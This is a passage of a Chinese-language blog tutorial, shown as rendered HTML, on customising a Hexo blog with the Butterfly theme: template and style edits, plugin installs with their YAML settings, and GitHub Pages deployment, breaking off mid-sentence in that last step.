class="string">&#x27;html&#x27;</span>)[<span class="number">0</span>].<span class="title function_">getAttribute</span>(<span class="string">&#x27;data-theme&#x27;</span>) == <span class="string">&#x27;dark&#x27;</span> &amp;&amp; <span class="title function_">u</span>(),</span><br><span class="line">        <span class="variable language_">window</span>.<span class="title function_">requestAnimationFrame</span>(t)</span><br><span class="line">    &#125;()</span><br><span class="line">&#125;</span><br><span class="line">;<span class="title function_">dark</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>              </div>            </details><h3 id="pug文件修改"><a href="#pug文件修改" class="headerlink" title="pug文件修改"></a>pug文件修改</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <ol><li><p>去除搜索二字</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Blog\themes\Butterfly\layout\includes\header\nav.pug</span></span><br><span class="line"></span><br><span class="line">对下列语句进行注释：<span class="comment">// span=&#x27; &#x27;+_p(&#x27;search.title&#x27;)</span></span><br></pre></td></tr></table></figure></li><li><p>直达顶部和底部</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Blog\themes\butterfly\layout\includes\rightside.pug</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*在</span></span><br><span class="line"><span class="comment">if showArray</span></span><br><span class="line"><span class="comment">    +rightsideItem(showArray)</span></span><br><span class="line"><span class="comment">加上如下代码：（首缩进同if）*/</span></span><br><span class="line"><span class="comment">// 顶部百分比</span></span><br><span class="line">button#go-<span class="title function_">up</span>(type=<span class="string">&quot;button&quot;</span> title=<span class="title function_">_p</span>(<span class="string">&quot;rightside.back_to_top&quot;</span>))</span><br><span class="line">  i.<span class="property">fas</span>.<span class="property">fa</span>-arrow-up</span><br><span class="line">  span#percent <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 直达底部</span></span><br><span class="line">button#go-<span class="title function_">up</span>(type=<span class="string">&quot;button&quot;</span> title=<span class="title function_">_p</span>(<span class="string">&quot;rightside.back_to_top&quot;</span>))</span><br><span class="line">  i.<span class="property">fas</span>.<span class="property">fa</span>-arrow-up</span><br><span class="line"><span class="comment">// 上述代码替换如下代码</span></span><br><span class="line">button#go-<span class="title function_">down</span>(type=<span class="string">&quot;button&quot;</span> title=<span class="string">&quot;直达底部&quot;</span> onclick=<span class="string">&quot;btf.scrollToDest(document.body.scrollHeight, 500)&quot;</span>)</span><br><span class="line">  i.<span class="property">fas</span>.<span class="property">fa</span>-arrow-down</span><br></pre></td></tr></table></figure></li></ol>              </div>            </details><h3 id="styl文件修改"><a href="#styl文件修改" class="headerlink" title="styl文件修改"></a>styl文件修改</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <p>微改版权样式</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Blog\themes\butterfly\source\css\_layout\post.styl</span></span><br><span class="line"><span class="comment">// 初始</span></span><br><span class="line">  <span class="selector-class">.post-copyright</span></span><br><span class="line">    <span class="attribute">position</span>: relative</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">40px</span> <span class="number">0</span> <span class="number">10px</span></span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">16px</span></span><br><span class="line">    <span class="attribute">border</span>: <span class="number">3px</span> solid <span class="built_in">var</span>(--light-grey)</span><br><span class="line">    <span class="attribute">transition</span>: box-shadow .<span class="number">3s</span> ease-in-out</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">12px</span><span class="meta">!important</span></span><br><span class="line">    </span><br><span class="line">    <span class="selector-pseudo">&amp;:hover</span></span><br><span class="line">      <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">8px</span> <span class="number">0</span> <span class="built_in">rgba</span>(<span class="number">232</span>, <span class="number">237</span>, <span class="number">250</span>, .<span class="number">6</span>), <span class="number">0</span> <span class="number">2px</span> <span class="number">4px</span> <span class="number">0</span> <span class="built_in">rgba</span>(<span class="number">232</span>, <span class="number">237</span>, <span class="number">250</span>, .<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改后</span></span><br><span class="line">  <span class="selector-class">.post-copyright</span></span><br><span class="line">    <span class="attribute">position</span>: relative</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">40px</span> <span class="number">0</span> <span class="number">10px</span></span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">16px</span></span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> solid <span class="built_in">rgb</span>(<span class="number">169</span>, <span class="number">225</span>, <span class="number">193</span>)</span><br><span class="line">    <span class="attribute">transition</span>: box-shadow .<span class="number">3s</span> ease-in-out</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">12px</span><span class="meta">!important</span></span><br><span class="line">    </span><br><span class="line">    <span class="selector-pseudo">&amp;:hover</span></span><br><span class="line">      <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">8px</span> <span class="number">0</span> <span class="built_in">rgba</span>(<span class="number">169</span>, <span class="number">225</span>, <span class="number">193</span>, .<span class="number">6</span>), <span class="number">0</span> <span class="number">2px</span> <span class="number">4px</span> <span class="number">0</span> <span class="built_in">rgba</span>(<span class="number">169</span>, <span class="number">225</span>, <span class="number">193</span>, .<span class="number">5</span>)</span><br></pre></td></tr></table></figure>              </div>            </details><hr><h2 id="二、复杂插件配置"><a href="#二、复杂插件配置" class="headerlink" title="二、复杂插件配置"></a>二、复杂插件配置</h2><h3 id="评论信箱"><a href="#评论信箱" class="headerlink" title="评论信箱"></a>评论信箱</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <p><a href="https://akilar.top/posts/e2d3c450/">author::信笺样式留言板</a></p><ol><li><p>在blog下运行<code>npm install hexo-butterfly-envelope --save</code></p></li><li><p>在butterfly的配置中加入</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 信箱评论</span></span><br><span class="line"><span class="comment"># envelope_comment</span></span><br><span class="line"><span class="comment"># see https://akilar.top/posts/e2d3c450/</span></span><br><span class="line"><span class="attr">envelope_comment:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment">#控制开关</span></span><br><span class="line">  <span class="attr">custom_pic:</span>      </span><br><span class="line">    <span class="attr">cover:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-envelope/lib/violet.jpg</span> <span class="comment">#信笺头部图片</span></span><br><span class="line">    <span class="attr">line:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-envelope/lib/line.png</span> <span class="comment">#信笺底部图片</span></span><br><span class="line">    <span class="attr">beforeimg:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-envelope/lib/before.png</span> <span class="comment"># 信封前半部分</span></span><br><span class="line">    <span class="attr">afterimg:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-envelope/lib/after.png</span> <span class="comment"># 信封后半部分</span></span><br><span class="line">  <span class="attr">message:</span> <span class="comment">#信笺正文，多行文本，写法如下</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">有什么想问的？</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">有什么想说的？</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">有什么想吐槽的？</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">哪怕是有什么想吃的，都可以告诉我哦~</span></span><br><span class="line">  <span class="attr">bottom:</span> <span class="string">自动书记人偶竭诚为您服务！</span> <span class="comment">#仅支持单行文本</span></span><br><span class="line">  <span class="attr">height:</span> <span class="comment">#1050px，信封划出的高度</span></span><br><span class="line">  <span class="attr">path:</span> <span class="comment">#【可选】comments 的路径名称。默认为 comments，生成的页面为 comments/index.html</span></span><br><span class="line">  <span class="attr">front_matter:</span> <span class="comment">#【可选】comments页面的 front_matter 配置</span></span><br><span class="line">    <span class="attr">title:</span> <span class="string">留言板</span></span><br><span class="line">    <span class="attr">comments:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li></ol>              </div>            </details><h3 id="页脚徽标"><a href="#页脚徽标" class="headerlink" title="页脚徽标"></a>页脚徽标</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <p><a href="https://akilar.top/posts/e2d3c450/">author::Add Github Badge</a></p><ol><li><p>在blog下运行<code>npm install hexo-butterfly-footer-beautify --save</code></p></li><li><p>在butterfly的配置中加入</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 页脚内容</span></span><br><span class="line"><span class="comment"># footer_beautify</span></span><br><span class="line"><span class="comment"># 页脚计时器：[Native JS Timer](https://akilar.top/posts/b941af/)</span></span><br><span class="line"><span class="comment"># 页脚徽标：[Add Github Badge](https://akilar.top/posts/e87ad7f8/)</span></span><br><span class="line"><span class="attr">footer_beautify:</span></span><br><span class="line">  <span class="attr">enable:</span></span><br><span class="line">    <span class="attr">timer:</span> <span class="literal">true</span> <span class="comment"># 计时器开关</span></span><br><span class="line">    <span class="attr">bdage:</span> <span class="literal">true</span> <span class="comment"># 徽标开关</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="number">5</span> <span class="comment">#过滤器优先权</span></span><br><span class="line">  <span class="attr">enable_page:</span> <span class="string">all</span> <span class="comment"># 应用页面</span></span><br><span class="line">  <span class="attr">exclude:</span> <span class="comment">#屏蔽页面</span></span><br><span class="line">    <span class="comment"># - /posts/</span></span><br><span class="line">    <span class="comment"># - /about/</span></span><br><span class="line">  <span class="attr">layout:</span> <span class="comment"># 挂载容器类型</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">id</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">footer-wrap</span></span><br><span class="line">    <span class="attr">index:</span> <span class="number">0</span></span><br><span class="line">  <span class="comment"># 计时器部分配置项（看你喜欢哪个，最好下载下来放到自己的项目中不然会增加我网站的负载）</span></span><br><span class="line">  <span class="comment"># 这是我的  </span></span><br><span class="line">  <span class="comment"># runtime_js: https://www.fomal.cc/static/js/runtime.js</span></span><br><span class="line">  <span class="comment"># runtime_css: https://www.fomal.cc/static/css/runtime.min.css </span></span><br><span class="line">  <span class="comment"># 这是店长的 </span></span><br><span class="line">  <span class="attr">runtime_js:</span> <span class="string">/js/runtime.js</span></span><br><span class="line">  <span class="attr">runtime_css:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.css</span></span><br><span class="line">  <span class="comment"># 徽标部分配置项</span></span><br><span class="line">  <span class="attr">swiperpara:</span> <span class="number">0</span> <span class="comment">#若非0，则开启轮播功能，每行徽标个数</span></span><br><span class="line">  <span class="attr">bdageitem:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">link:</span> <span class="string">https://hexo.io/</span> <span class="comment">#徽标指向网站链接</span></span><br><span class="line">      <span class="attr">shields:</span> <span class="string">https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo</span> <span class="comment">#徽标API</span></span><br><span class="line">      <span class="attr">message:</span> <span class="string">博客框架为Hexo_v6.3.0</span> <span class="comment">#徽标提示语</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">link:</span> <span class="string">https://butterfly.js.org/</span></span><br><span class="line">      <span class="attr">shields:</span> <span class="string">https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender</span></span><br><span class="line">      <span class="attr">message:</span> <span class="string">主题版本Butterfly_v4.8.5</span></span><br><span class="line">    <span class="comment"># - link: https://vercel.com/</span></span><br><span class="line">    <span class="comment">#   shields: https://img.shields.io/badge/Hosted-Vercel-brightgreen?style=flat&amp;logo=Vercel</span></span><br><span class="line">    <span class="comment">#   message: 本站采用多线部署，主线路托管于Vercel</span></span><br><span class="line">    <span class="comment"># - link: https://dashboard.4everland.org/</span></span><br><span class="line">    <span class="comment"># # https://img.shields.io/badge/Hosted-4EVERLAND-3FE2C1?style=flat&amp;logo=IPFS</span></span><br><span class="line">    <span class="comment">#   shields: https://img.shields.io/badge/Hosted-4EVERLAND-22DDDD?style=flat&amp;logo=IPFS</span></span><br><span class="line">    <span class="comment">#   message: 本站采用多线部署，备用线路托管于4EVERLAND</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">link:</span> <span class="string">https://github.com/</span></span><br><span class="line">      <span class="attr">shields:</span> <span class="string">https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub</span></span><br><span class="line">      <span class="attr">message:</span> <span class="string">本站项目由Github托管</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">link:</span> <span class="string">http://creativecommons.org/licenses/by-nc-sa/4.0/</span></span><br><span class="line">      <span class="attr">shields:</span> <span class="string">https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris</span></span><br><span class="line">      <span class="attr">message:</span> <span class="string">本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可</span></span><br><span class="line">  <span class="attr">swiper_css:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css</span></span><br><span class="line">  <span class="attr">swiper_js:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js</span></span><br><span class="line">  <span class="attr">swiperbdage_init_js:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-footer-beautify/lib/swiperbdage_init.min.js</span></span><br></pre></td></tr></table></figure></li></ol>              </div>            </details><h3 id="首页分类磁贴"><a href="#首页分类磁贴" class="headerlink" title="首页分类磁贴"></a>首页分类磁贴</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <p><a href="https://akilar.top/posts/a9131002/">author::Categories Magnet</a></p><ol><li><p>在blog下运行<code>npm install hexo-butterfly-categories-card --save</code></p></li><li><p>在butterfly的配置中加入</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 分类栏</span></span><br><span class="line"><span class="comment"># hexo-butterfly-categories-card</span></span><br><span class="line"><span class="comment"># see https://akilar.top/posts/a9131002/</span></span><br><span class="line"><span class="attr">categoryBar:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># 开关</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="number">5</span> <span class="comment">#过滤器优先权</span></span><br><span class="line">  <span class="attr">enable_page:</span> <span class="string">/</span> <span class="comment"># 应用页面</span></span><br><span class="line">  <span class="attr">layout:</span> <span class="comment"># 挂载容器类型</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">id</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">recent-posts</span></span><br><span class="line">    <span class="attr">index:</span> <span class="number">0</span></span><br><span class="line">  <span class="attr">column:</span> <span class="string">odd</span> <span class="comment"># odd：3列 | even：4列</span></span><br><span class="line">  <span class="attr">row:</span> <span class="number">1</span> <span class="comment">#显示行数，默认两行，超过行数切换为滚动显示</span></span><br><span class="line">  <span class="attr">message:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">descr:</span> <span class="string">编程语言知识</span> <span class="comment"># 编程语言</span></span><br><span class="line">      <span class="attr">cover:</span> <span class="string">/img/default_cover_1.png</span></span><br><span class="line">  <span class="attr">custom_css:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-categories-card@1.0.0/lib/categorybar.css</span></span><br></pre></td></tr></table></figure></li></ol>              </div>            </details><h3 id="首页轮播栏"><a href="#首页轮播栏" class="headerlink" title="首页轮播栏"></a>首页轮播栏</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <p><a href="https://akilar.top/posts/8e1264d1/">author::Swiper Bar</a></p><ol><li><p>在blog下运行<code>npm install hexo-butterfly-swiper --save</code></p></li><li><p>在butterfly的配置中加入</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 首页轮播栏</span></span><br><span class="line"><span class="comment"># hexo-butterfly-swiper</span></span><br><span class="line"><span class="comment"># see https://akilar.top/posts/8e1264d1/</span></span><br><span class="line"><span class="attr">swiper:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># 开关</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="number">7</span> <span class="comment">#过滤器优先权</span></span><br><span class="line">  <span class="attr">enable_page:</span> <span class="string">/</span> <span class="comment"># 应用页面</span></span><br><span class="line">  <span class="attr">timemode:</span> <span class="string">update</span> <span class="comment">#date/updated</span></span><br><span class="line">  <span class="attr">layout:</span> <span class="comment"># 挂载容器类型</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">id</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">recent-posts</span></span><br><span class="line">    <span class="attr">index:</span> <span class="number">0</span></span><br><span class="line">  <span class="attr">default_descr:</span> <span class="string">再怎么看我也不知道怎么描述它的啦！</span></span><br><span class="line">  <span class="attr">swiper_css:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css</span> <span class="comment">#swiper css依赖</span></span><br><span class="line">  <span class="attr">swiper_js:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js</span> <span class="comment">#swiper js依赖</span></span><br><span class="line">  <span class="attr">custom_css:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css</span> <span class="comment"># 适配主题样式补丁</span></span><br><span class="line">  <span class="attr">custom_js:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js</span> <span class="comment"># swiper初始化方法</span></span><br></pre></td></tr></table></figure></li></ol>              </div>            </details><h3 id="文章双栏显示"><a href="#文章双栏显示" class="headerlink" title="文章双栏显示"></a>文章双栏显示</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <ol><li><p>在blog下运行<code>npm i hexo-butterfly-article-double-row --save</code></p></li><li><p>在hexo的配置中加入</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文章双栏显示</span></span><br><span class="line"><span class="attr">butterfly_article_double_row:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>翻页按钮可能存在bug，在custom.css中加上</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*底部页面选项栏*/</span></span><br><span class="line"><span class="comment">/* 翻页按钮居中 */</span></span><br><span class="line"><span class="selector-id">#pagination</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">margin</span>: auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>              </div>            </details><h3 id="wowjs动画"><a href="#wowjs动画" class="headerlink" title="wowjs动画"></a>wowjs动画</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <p><a href="https://akilar.top/posts/abab51cf/">author::Add Blog Animation</a></p><ol><li><p>在blog下运行<code>npm install hexo-butterfly-wowjs --save</code></p></li><li><p>在butterfly的配置中加入</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 出场动画</span></span><br><span class="line"><span class="attr">wowjs:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment">#控制动画开关。true是打开，false是关闭</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="number">10</span> <span class="comment">#过滤器优先级</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">false</span> <span class="comment">#移动端是否启用，默认移动端禁用</span></span><br><span class="line">  <span class="attr">animateitem:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">class:</span> <span class="string">recent-post-item</span> <span class="comment">#必填项，需要添加动画的元素的class，文章卡片</span></span><br><span class="line">      <span class="attr">style:</span> <span class="string">animate__fadeIn</span> <span class="comment">#必填项，需要添加的动画</span></span><br><span class="line">      <span class="attr">duration:</span> <span class="string">2s</span> <span class="comment">#选填项，动画持续时间，单位可以是ms也可以是s。例如3s，700ms。</span></span><br><span class="line">      <span class="comment"># delay: 0s #选填项，动画开始的延迟时间，单位可以是ms也可以是s。例如3s，700ms。</span></span><br><span class="line">      <span class="attr">offset:</span> <span class="number">100</span> <span class="comment">#选填项，开始动画的距离（相对浏览器底部）</span></span><br><span class="line">      <span class="comment"># iteration: 1 #选填项，动画重复的次数</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">class:</span> <span class="string">card-widget</span> <span class="comment"># 侧边栏</span></span><br><span class="line">      <span class="attr">style:</span> <span class="string">animate__fadeInRight</span></span><br><span class="line">      <span class="attr">duration:</span> <span class="number">1.</span><span class="string">25s</span></span><br><span class="line">      <span class="attr">offset:</span> <span class="number">100</span></span><br><span class="line">  <span class="attr">animate_css:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css</span></span><br><span class="line">  <span class="attr">wow_js:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js</span></span><br><span class="line">  <span class="attr">wow_init_js:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js</span></span><br></pre></td></tr></table></figure></li></ol>              </div>            </details><h3 id="MD外挂标签"><a href="#MD外挂标签" class="headerlink" title="MD外挂标签"></a>MD外挂标签</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <p><a href="https://akilar.top/posts/615e2dec/">author::Tag Plugins Plus</a></p><ol><li><p>在blog下运行<code>npm install hexo-butterfly-tag-plugins-plus --save</code></p></li><li><p>hexo自带的插件可能兼容性差，用<a href="https://www.npmjs.com/package/hexo-renderer-kramed">hexo-renderer-kramed</a>替换：</p><ul><li><code>npm uninstall hexo-renderer-marked --save</code> </li><li><code>npm install hexo-renderer-kramed --save</code></li></ul></li><li><p>在butterfly的配置中加入</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># tag-plugins-plus</span></span><br><span class="line"><span class="comment"># see https://akilar.top/posts/615e2dec/</span></span><br><span class="line"><span class="attr">tag_plugins:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># 开关</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="number">5</span> <span class="comment">#过滤器优先权</span></span><br><span class="line">  <span class="attr">issues:</span> <span class="literal">false</span> <span class="comment">#issues标签依赖注入开关</span></span><br><span class="line">  <span class="attr">link:</span></span><br><span class="line">    <span class="attr">placeholder:</span> <span class="string">/img/link.png</span> <span class="comment">#link_card标签默认的图标图片</span></span><br><span class="line">  <span class="attr">CDN:</span></span><br><span class="line">    <span class="attr">anima:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css</span> <span class="comment">#动画标签anima的依赖</span></span><br><span class="line">    <span class="attr">jquery:</span> <span class="string">https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js</span> <span class="comment">#issues标签依赖</span></span><br><span class="line">    <span class="attr">issues:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/issues.js</span> <span class="comment">#issues标签依赖</span></span><br><span class="line">    <span class="attr">iconfont:</span> <span class="string">//at.alicdn.com/t/font_2032782_8d5kxvn09md.js</span> <span class="comment">#参看https://akilar.top/posts/d2ebecef/</span></span><br><span class="line">    <span class="attr">carousel:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js</span></span><br><span class="line">    <span class="attr">tag_plugins_css:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css</span></span><br></pre></td></tr></table></figure></li></ol><p>网站常用外挂标签如下</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">// 链接</span><br><span class="line">&#123;% link 标题, 链接, 图片链接（可选） %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 时间轴</span><br><span class="line">&#123;% timeline 时间线标题（可选）[,color] %&#125;</span><br><span class="line">&lt;!-- timeline 时间节点（标题） --&gt;</span><br><span class="line">正文内容</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&lt;!-- timeline 时间节点（标题） --&gt;</span><br><span class="line">正文内容</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&#123;% endtimeline %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 折叠框（参数1:blue,cyan等，参数2:open）</span><br><span class="line">&#123;% folding 参数（可选）, 标题 %&#125;</span><br><span class="line">内容</span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 分栏</span><br><span class="line">&#123;% tabs Unique name %&#125;</span><br><span class="line">&lt;!--tab name--&gt;</span><br><span class="line">内容</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&lt;!--tab name--&gt;</span><br><span class="line">内容</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">表格中用：&amp;#124; 代替 |</span><br></pre></td></tr></table></figure>              </div>            </details><h3 id="图片渲染"><a href="#图片渲染" class="headerlink" title="图片渲染"></a>图片渲染</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <ol><li><p>安装<code>npm install hexo-asset-image --save</code></p></li><li><p>在hexo配置文件中配置</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 45行</span></span><br><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>引用图片时用<code>page_name/img_name.jpg</code>，其中page_name为文章所处文件夹下的一个与文章同名的文件夹。</p></li></ol>              </div>            </details><h3 id="永久链接"><a href="#永久链接" class="headerlink" title="永久链接"></a>永久链接</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <p><a href="https://zhuanlan.zhihu.com/p/169492685">author::Hexo-abbrlink插件生成永久固定链接</a></p><ol><li><p>安装<code>npm install hexo-abbrlink --save</code></p></li><li><p>在hexo配置文件中设置</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">permalink:</span> <span class="string">posts/:abbrlink.html</span>  <span class="comment"># 此处可以自己设置，也可以直接使用 :/abbrlink</span></span><br><span class="line"><span class="attr">abbrlink:</span></span><br><span class="line">    <span class="attr">alg:</span> <span class="string">crc32</span>   <span class="comment">#算法： crc16(default) and crc32</span></span><br><span class="line">    <span class="attr">rep:</span> <span class="string">hex</span>     <span class="comment">#进制： dec(default) and hex</span></span><br><span class="line"></span><br><span class="line"><span class="string">//</span> <span class="string">下面是不同配置的效果</span></span><br><span class="line"><span class="string">crc16</span> <span class="string">&amp;</span> <span class="string">hex</span></span><br><span class="line"><span class="string">https://test.com/posts/55c6.html</span></span><br><span class="line"><span class="string">crc16</span> <span class="string">&amp;</span> <span class="string">dec</span></span><br><span class="line"><span class="string">https://test.com/posts/43212.html</span></span><br><span class="line"></span><br><span class="line"><span class="string">crc32</span> <span class="string">&amp;</span> <span class="string">hex</span></span><br><span class="line"><span class="string">https://test.com/posts/6ec16a2c.html</span></span><br><span class="line"><span class="string">crc32</span> <span class="string">&amp;</span> <span class="string">dec</span></span><br><span class="line"><span class="string">https://test.com/posts/1521457752.html</span></span><br></pre></td></tr></table></figure></li></ol>              </div>            </details><h2 id="三、上传github"><a href="#三、上传github" class="headerlink" title="三、上传github"></a>三、上传github</h2><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <ol><li><p>在github中新建一个仓库，仓库名是<code>&lt;username&gt;.github.io</code>，要公开。创建好后可以在setting里找到pages，brance选择main保存。选好后在pages页最上面会显示Your site is live at url，表示网址已经可以被访问了。</p></li><li><p>在blog根目录下执行如下操作</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.绑定用户名：git config --global user.name <span class="string">&quot;yourname&quot;</span></span><br><span class="line">2.绑定邮箱：git config --global user.email <span class="string">&quot;your_e_mail&quot;</span></span><br><span class="line">3.生成密钥：ssh-keygen -t rsa -C <span class="string">&quot;your_email&quot;</span></span><br><span class="line"><span class="comment"># 然后全回车，密钥文件在[C:\Users\用户名\.ssh\id_rsa.pub]，该文件可能被隐藏。</span></span><br></pre></td></tr></table></figure></li><li><p>点击个人头像进入setting——SSH and GPG keys，新建一个SSH密钥，密钥填入刚刚记事本的中的密钥。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">验证密钥：ssh -T git@github.com</span><br><span class="line"><span class="comment"># 输出successfully表示验证成功</span></span><br></pre></td></tr></table></figure></li><li><p>在Blog根目录下安装<code>npm install hexo-deployer-git --save</code></p></li><li><p>进入Blog的配置文件</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 113行</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repository:</span> <span class="string">git@github.com:&lt;your_name&gt;/&lt;your_name&gt;.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure></li><li><p>上传页面（上传后分支如果不是main要在pages中改）</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">上传页面：hexo d</span><br><span class="line">更新页面：hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br><span class="line"></span><br><span class="line">hexo clean：删除之前生成的文件。</span><br><span class="line">hexo g(generate)：生成静态文章。</span><br><span class="line">hexo d(deploy)：部署文章。</span><br><span class="line"></span><br><span class="line">显示Deploy <span class="keyword">done</span>: 